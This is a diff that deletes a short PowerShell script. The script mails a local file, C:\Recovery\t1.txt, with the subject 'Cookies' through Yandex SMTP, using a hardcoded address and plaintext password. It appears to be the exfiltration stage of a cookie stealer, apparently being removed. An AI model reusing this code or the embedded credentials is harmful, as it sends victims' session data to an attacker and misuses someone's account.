@@ -1,9 +1,0 @@
-$from = "lisatgeorgee@yandex.com"
-$to = "lisatgeorgee@yandex.com"
-$attachment = 'C:\Recovery\t1.txt'
-$smtp = "smtp.yandex.ru"
-$secpasswd = ConvertTo-SecureString "j7CoYu87GKQZcdxu" -AsPlainText -Force
-$cred = New-Object System.Management.Automation.PSCredential ($from, $secpasswd)
-$subject = "Cookies"
-
-Send-MailMessage -Credential $cred -UseSsl -Subject $subject -From $from -To $to -Attachments $attachment -SmtpServer $smtp
